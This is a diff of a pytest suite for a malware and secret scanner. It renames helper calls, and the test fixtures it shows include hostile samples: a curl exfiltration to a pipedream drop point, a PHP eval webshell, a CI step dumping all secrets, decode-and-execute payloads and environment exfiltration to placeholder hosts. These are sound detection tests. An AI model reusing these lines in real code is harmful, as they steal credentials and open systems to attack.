         ("name", "body"),
@@ -9296,7 +9303,7 @@ class TestASleepInALoopIsAHeartbeat:
             "    while True:\n"
             "        time.sleep(3600)\n"
         )
-        assert "SUSPECT.ANTI_ANALYSIS.001" not in flagged(tmp_path)
+        assert "SUSPECT.ANTI_ANALYSIS.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_same_sleep_before_the_payload_is_still_not_evasion(self, tmp_path) -> None:
         """This was written as the control and it failed within the same pass, which is
@@ -9314,7 +9321,7 @@ class TestASleepInALoopIsAHeartbeat:
             "    time.sleep(3600)\n"
             "    subprocess.run(base64.b64decode(blob), shell=True)\n"
         )
-        rules = flagged(tmp_path)
+        rules = ReviewDefectsHelpers.flagged(tmp_path)
         assert "SUSPECT.ANTI_ANALYSIS.001" not in rules
         assert "SUSPECT.DECODE_EXEC.001" in rules
 
@@ -9328,7 +9335,7 @@ class TestASleepInALoopIsAHeartbeat:
             "        sys.exit(0)\n"
             "    subprocess.run(base64.b64decode(blob), shell=True)\n"
         )
-        assert "SUSPECT.ANTI_ANALYSIS.001" in flagged(tmp_path)
+        assert "SUSPECT.ANTI_ANALYSIS.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestTheMarkersAProjectPutsOnAKeyItGenerates:
@@ -9398,13 +9405,13 @@ class TestWhatTheThirteenthPassConfirmed:
             "      - run: env\n        env:\n"
             "          ALLMYSECRETS: ${{ toJSON(secrets) }}\n"
         )
-        assert "MALWARE.CI.SECRET_EXFIL.001" in flagged(tmp_path)
+        assert "MALWARE.CI.SECRET_EXFIL.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_php_webshell(self, tmp_path) -> None:
         (tmp_path / "w.php").write_text(
             "<?php\n@eval(gzinflate(base64_decode('c29tZXRoaW5nIGVsc2UgZW50aXJlbHk=')));\n"
         )
-        rules = flagged(tmp_path)
+        rules = ReviewDefectsHelpers.flagged(tmp_path)
         assert "SUSPECT.DECODE_CHAIN.001" in rules or "SUSPECT.DECODE_EXEC.001" in rules
 
 
@@ -9518,7 +9525,7 @@ class TestADelayIsNotACheck:
             'subprocess.run(base64.b64decode(b"ZWNobyB4"), shell=True)\n\n'
             'setup(name="x", version="1.0.0")\n'
         )
-        assert "MALWARE.ANTI_ANALYSIS.001" in flagged(tmp_path)
+        assert "MALWARE.ANTI_ANALYSIS.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestHelpTextTheCommandPrints:
@@ -9551,7 +9558,7 @@ class TestHelpTextTheCommandPrints:
     @staticmethod
     def _rules(tmp_path, name: str, body: str) -> set[str]:
         (tmp_path / name).write_text(body)
-        return flagged(tmp_path)
+        return ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_cobra_example_block_is_help_text(self, tmp_path) -> None:
         assert "SECRET.GENERIC.ASSIGNMENT.001" not in self._rules(
@@ -9661,7 +9668,7 @@ class TestGrafanasDefaultSecretKey:
 
     def test_the_published_default_is_not_a_leak(self, tmp_path) -> None:
         (tmp_path / "defaults.ini").write_text(f";secret_key = {self.VALUE}\n")
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_and_not_in_the_check_that_detects_it_either(self, tmp_path) -> None:
         (tmp_path / "step.go").write_text(
@@ -9669,7 +9676,7 @@ class TestGrafanasDefaultSecretKey:
             "\t// nolint:gosec // Defined in defaults.ini originally\n"
             f'\tdefaultSecretKey = "{self.VALUE}"\n)\n'
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_changed_key_still_reports(self, tmp_path) -> None:
         """The control, and the whole point of Grafana's advisor: the value matters
@@ -9677,7 +9684,7 @@ class TestGrafanasDefaultSecretKey:
         (tmp_path / "grafana.ini").write_text(
             "secret_key = " + Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE") + "\n"
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAPublishedExploitIsPublishedToBeRun:
@@ -9761,7 +9768,9 @@ class TestAPublishedExploitIsPublishedToBeRun:
         ]
         assert found, "the key is still reported"
         assert all(f.severity <= Severity.LOW for f in found)
-        assert "SECRET.PRIVATE_KEY.001" not in flagged(tmp_path), "and it does not block"
+        assert "SECRET.PRIVATE_KEY.001" not in ReviewDefectsHelpers.flagged(tmp_path), (
+            "and it does not block"
+        )
 
     def test_the_same_key_in_ordinary_source_is_not(self, tmp_path) -> None:
         """The control. What excuses the module is its own declaration, and an application
@@ -9772,7 +9781,7 @@ class TestAPublishedExploitIsPublishedToBeRun:
             + "\\n-----END RSA PRIVATE KEY-----"
         )
         (tmp_path / "deploy.rb").write_text(f'DEPLOY_KEY = "{body}".freeze\n')
-        assert "SECRET.PRIVATE_KEY.001" in flagged(tmp_path)
+        assert "SECRET.PRIVATE_KEY.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAKeyTheSitesOwnPlayerHolds:
@@ -9844,7 +9853,7 @@ class TestAKeyTheSitesOwnPlayerHolds:
         that hardcodes a key has made no such declaration and can rotate it."""
         value = Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")
         (tmp_path / "client.py").write_text(f"_API_KEY = '{value}'\n")
-        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAWebhookSaysWhatToInspectNotWhatToGrant:
@@ -9973,7 +9982,7 @@ class TestAnAuthorTimeHookDoesNotReachAConsumer:
             '{ "name": "x", "version": "1.0.0", "scripts": '
             f'{{ "{hook}": "node scripts/prepare.mjs" }} }}\n'
         )
-        return flagged(tmp_path)
+        return ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize("hook", ["prepare", "prepack", "prepublishOnly"])
     def test_the_script_it_names_is_not_install_time(self, tmp_path, hook: str) -> None:
@@ -10566,7 +10575,7 @@ class TestNinePackagesPublishedInOneWeek:
             "exec(command, (error, stdout, stderr) => { if (error) { return; } });\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.EXFIL.DROP_POINT.001" in blocking(tmp_path)
+        assert "SUSPECT.EXFIL.DROP_POINT.001" in ReviewDefectsHelpers.blocking(tmp_path)
 
     def test_the_same_command_written_inline(self, tmp_path) -> None:
         """The control: indirection is the only difference."""
@@ -10575,7 +10584,7 @@ class TestNinePackagesPublishedInOneWeek:
             'exec(`curl -X POST "https://abc123.m.pipedream.net/$(whoami)/$(hostname)/"`);\n',
             encoding="utf-8",
         )
-        assert "SUSPECT.EXFIL.DROP_POINT.001" in blocking(tmp_path)
+        assert "SUSPECT.EXFIL.DROP_POINT.001" in ReviewDefectsHelpers.blocking(tmp_path)
 
     def test_a_shell_piped_to_a_socket(self, tmp_path) -> None:
         """`flickering-fir-572` and `sprucey-fireplace-355` are reverse shells.
@@ -10592,7 +10601,7 @@ class TestNinePackagesPublishedInOneWeek:
             "});\n",
             encoding="utf-8",
         )
-        assert "MALWARE.REVERSE_SHELL.001" in blocking(tmp_path)
+        assert "MALWARE.REVERSE_SHELL.001" in ReviewDefectsHelpers.blocking(tmp_path)
 
     def test_a_client_talking_to_a_named_host_is_not(self, tmp_path) -> None:
         """The control, and the reason the rule wants a literal address: a
@@ -10606,7 +10615,7 @@ class TestNinePackagesPublishedInOneWeek:
             'const worker = spawn("node", ["worker.js"]);\n',
             encoding="utf-8",
         )
-        assert "MALWARE.REVERSE_SHELL.001" not in flagged(tmp_path)
+        assert "MALWARE.REVERSE_SHELL.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAFileWrittenOnWindows:
@@ -10738,7 +10747,7 @@ class TestAskingWhetherASettingIsSetIsNotReadingACredential:
             '    if "DOWNLOAD_BOOTSTRAP_SCRIPT" in os.environ:\n'
             '        urlretrieve("https://github.com/saltstack/salt-bootstrap/raw/x", "b.sh")\n'
         )
-        assert not {f for f in flagged(tmp_path) if "EXFIL" in f}
+        assert not {f for f in ReviewDefectsHelpers.flagged(tmp_path) if "EXFIL" in f}
 
 
 class TestOneObservationIsOneFinding:
@@ -11102,7 +11111,7 @@ class TestNothingOwnsANetrc:
 
     def test_reading_a_netrc_to_download_is_not_a_credential_store(self, tmp_path) -> None:
         (tmp_path / "bazelisk.py").write_text(self.BAZELISK, encoding="utf-8")
-        assert "SUSPECT.EXFIL.CREDENTIAL_STORE.001" not in flagged(tmp_path)
+        assert "SUSPECT.EXFIL.CREDENTIAL_STORE.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_netrc_is_still_credential_material(self) -> None:
         """Removed from the two-signal rule, not from the primitive. This is the
@@ -11132,7 +11141,7 @@ class TestNothingOwnsANetrc:
             'requests.post("https://drop.invalid/c", json={"rows": str(rows)})\n',
             encoding="utf-8",
         )
-        assert "SUSPECT.EXFIL.CREDENTIAL_STORE.001" in flagged(tmp_path)
+        assert "SUSPECT.EXFIL.CREDENTIAL_STORE.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestOneCallIsNotTwoSteps:
@@ -11175,7 +11184,7 @@ class TestOneCallIsNotTwoSteps:
     @staticmethod
     def _decode_exec(tmp_path, source: str) -> bool:
         (tmp_path / "subject.py").write_text(source, encoding="utf-8")
-        return "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+        return "SUSPECT.DECODE_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_loading_a_pyc_is_not_decode_and_execute(self, tmp_path) -> None:
         assert not self._decode_exec(tmp_path, self.IMPORTER)
@@ -11202,7 +11211,7 @@ class TestOneCallIsNotTwoSteps:
             "setup(name='x', version='1')\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestTestCasesIsATestDirectory:
@@ -11367,7 +11376,7 @@ class TestWhatRealMalwareActuallyLooksLike:
 
     @staticmethod
     def _rules(tmp_path) -> set[str]:
-        return flagged(tmp_path)
+        return ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_an_encoded_powershell_command_is_read(self, tmp_path) -> None:
         """`powershell -EncodedCommand <base64>` was 109 of the 171 misses.
@@ -11604,7 +11613,7 @@ class TestWhoseMachineTheCodeRunsOn:
 
     def _scan(self, tmp_path, source: str) -> set[str]:
         (tmp_path / "setup.py").write_text(source, encoding="utf-8")
-        return flagged(tmp_path)
+        return ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_an_install_override_that_reaches_the_network(self, tmp_path) -> None:
         assert "MALWARE.INSTALL.CONSUMER_CODE.001" in self._scan(tmp_path, self.MALICIOUS)
@@ -11697,7 +11706,7 @@ class TestTheSameActsInAnotherEcosystem:
         credential -- but a DNS label is 63 bytes, which is room for a machine
         name and not for a key. Both corrected."""
         (tmp_path / "index.js").write_text(self.DNS_EXFIL, encoding="utf-8")
-        assert "SUSPECT.EXFIL.DNS.001" in flagged(tmp_path)
+        assert "SUSPECT.EXFIL.DNS.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_resolving_a_name_you_wrote_down_is_not(self, tmp_path) -> None:
         (tmp_path / "index.js").write_text(
@@ -11706,11 +11715,11 @@ class TestTheSameActsInAnotherEcosystem:
             "dns.lookup(hostname, callback);\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.EXFIL.DNS.001" not in flagged(tmp_path)
+        assert "SUSPECT.EXFIL.DNS.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_package_that_publishes_packages(self, tmp_path) -> None:
         (tmp_path / "auto.js").write_text(self.SELF_PUBLISH, encoding="utf-8")
-        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" in flagged(tmp_path)
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_talking_about_publishing_is_not_publishing(self, tmp_path) -> None:
         """The rule's own negative samples caught the first draft of this: a
@@ -11720,7 +11729,7 @@ class TestTheSameActsInAnotherEcosystem:
             "console.log('next: npm publish');\nthrow new Error('you must npm publish first');\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in flagged(tmp_path)
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_fetch_awaited_into_a_variable_then_run(self, tmp_path) -> None:
         """`chai-smart-assert`, `chai-chain-test`, `chain-async-test`,
@@ -11748,7 +11757,7 @@ class TestTheSameActsInAnotherEcosystem:
             "})();\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.DROPPER.001" in blocking(tmp_path)
+        assert "SUSPECT.DROPPER.001" in ReviewDefectsHelpers.blocking(tmp_path)
 
     def test_constructor_is_the_function_constructor(self, tmp_path) -> None:
         """The narrower half on its own, shown through a rule that needs the
@@ -11761,7 +11770,7 @@ class TestTheSameActsInAnotherEcosystem:
             "f(require);\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_two_long_arrays_do_not_make_a_file_minified(self, tmp_path) -> None:
         """`budi-kue16-riris` is a registry-spam worm: generate a name from two
@@ -11789,7 +11798,7 @@ class TestTheSameActsInAnotherEcosystem:
             "}\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" in blocking(tmp_path)
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" in ReviewDefectsHelpers.blocking(tmp_path)
 
     def test_a_real_bundle_is_still_minified(self, tmp_path) -> None:
         """The other direction, so the fix above does not simply remove the
@@ -11854,14 +11863,14 @@ class TestTheSameActsInAnotherEcosystem:
             'var d=atob("Y29uc29sZS5sb2coMSk=");' + filler + ";eval(d);\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.DECODE_EXEC.001" not in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_decode_and_an_execute_in_the_same_breath_still_fire(self, tmp_path) -> None:
         """The control for the byte bound: adjacent is still adjacent."""
         (tmp_path / "a.js").write_text(
             'var d = atob("Y29uc29sZS5sb2coMSk=");\neval(d);\n', encoding="utf-8"
         )
-        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_buildutils_is_build_tooling(self, tmp_path) -> None:
         """`jupyterlab/jupyterlab` keeps `buildutils/src/local-repository.ts`,
@@ -11880,7 +11889,7 @@ class TestTheSameActsInAnotherEcosystem:
             "}\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in blocking(tmp_path)
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in ReviewDefectsHelpers.blocking(tmp_path)
 
     def test_the_expensive_sweeps_run_last(self) -> None:
         """The per-file budget is checked between detectors and keeps what has
@@ -11923,7 +11932,7 @@ class TestTheSameActsInAnotherEcosystem:
         )
         body = "".join(chunk % (i, i, i + 1, i, i) for i in range(60000))
         (package / "bundle.js").write_text("var a0_0x58e7a2=a0_0x5155;" + body, encoding="utf-8")
-        found = flagged(package)
+        found = ReviewDefectsHelpers.flagged(package)
         assert "SUSPECT.INSTALL.SCRIPT.001" in found
         assert "SUSPECT.OBFUSCATION.PACKED.001" in found or (
             "SUSPECT.OBFUSCATION.LONGLINE.001" in found
@@ -11947,7 +11956,7 @@ class TestTheSameActsInAnotherEcosystem:
             "  RISKY_COMMANDS.filter((r) => c.includes(r));\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in flagged(tmp_path)
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_release_script_is_release_tooling_in_any_language(self, tmp_path) -> None:
         """`apache/superset` keeps `release-if-necessary.js` in its embedded
@@ -11968,7 +11977,7 @@ class TestTheSameActsInAnotherEcosystem:
             "}\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in blocking(tmp_path)
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in ReviewDefectsHelpers.blocking(tmp_path)
 
     def test_building_an_environment_is_not_reading_credentials(self, tmp_path) -> None:
         """`{ ...process.env, FOO: undefined }` is how every Node program builds
@@ -11990,7 +11999,7 @@ class TestTheSameActsInAnotherEcosystem:
             "execFileSync('node', ['-v'], { env });\n",
             encoding="utf-8",
         )
-        assert "MALWARE.EXFIL.001" not in flagged(tmp_path)
+        assert "MALWARE.EXFIL.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_serialising_the_environment_still_is(self, tmp_path) -> None:
         """The guard that keeps the narrowing honest. Reading the environment to
@@ -12005,7 +12014,7 @@ class TestTheSameActsInAnotherEcosystem:
             "https.request('https://collect.invalid/p', { method: 'POST' }).end(body);\n",
             encoding="utf-8",
         )
-        assert "MALWARE.EXFIL.001" in flagged(tmp_path)
+        assert "MALWARE.EXFIL.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAHiddenPayloadDefeatsEveryExcuse:
